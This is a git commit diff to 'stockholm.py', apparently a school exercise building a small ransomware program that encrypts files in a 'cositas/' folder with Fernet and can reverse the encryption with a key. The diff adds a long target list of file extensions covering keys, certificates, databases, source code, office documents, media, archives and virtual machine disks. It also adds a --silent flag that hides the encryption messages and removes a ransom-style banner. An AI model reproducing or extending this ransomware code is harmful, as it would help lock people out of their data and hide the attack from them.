e1a2d00ea3404673330a68b77651e8a47956def1
Rafael Valdes collantes <rvaldes-@c3r2s3.42madrid.com>
2023-05-31 15:54:42 +0200

    all

--- stockholm.py
+++ stockholm.py
@@ -2,13 +2,36 @@ from cryptography.fernet import Fernet
 import sys
 import argparse
 import os
+
+extensions = [
+    '.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw',
+    '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif',
+    '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm',
+    '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb', '.mdb',
+    '.db', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln',
+    '.suo', '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat',
+    '.ps1', '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php',
+    '.asp', '.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla',
+    '.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp', '.mkv',
+    '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', '.ai', '.psd',
+    '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png', '.bmp', '.jpg', '.jpeg',
+    '.vcd', '.iso', '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak',
+    '.tbk', '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm',
+    '.sldx', '.sti', '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1',
+    '.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml', '.msg',
+    '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps', '.pot',
+    '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc', '.xlm', '.xlt', '.xlw',
+    '.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb',
+    '.docx', '.doc'
+]
 #cifrado simétrico AES (Advanced Encryption Standard)
 
 parser = argparse.ArgumentParser(description='Generate TOTP key')
 
 parser.add_argument('-r', '--reverse', type=str)
 parser.add_argument('-k', '--genkey')
-args = parser.parse_args()	
+parser.add_argument('-s', '--silent', action='store_true')
+args = parser.parse_args()    
 
 def genkey():
     my_key = Fernet.generate_key()
@@ -44,13 +67,7 @@ if args.genkey:
 
 
 dirpath = 'cositas/'
-if args.reverse:
-    print("Fixing everything...")
-else:
-    print("`. .´")
-    print("-----")
-    print("WOOOPS YOU MESSED UP")
-    print("-----------------")
+
 def getfiles(dirpath):
     filelist = os.listdir(dirpath)
     for file_n in filelist:
@@ -60,8 +77,9 @@ def getfiles(dirpath):
         if args.reverse:
             unencript_file(totalname, args.reverse)
         else:
-            if not os.path.isdir(totalname):
+            if not os.path.isdir(totalname) and not args.silent:
                 print(totalname + " has been encripted")
-            encript_file(totalname)
+            if totalname.endswith(tuple(extensions)):
+            	encript_file(totalname)
 
 getfiles(dirpath)
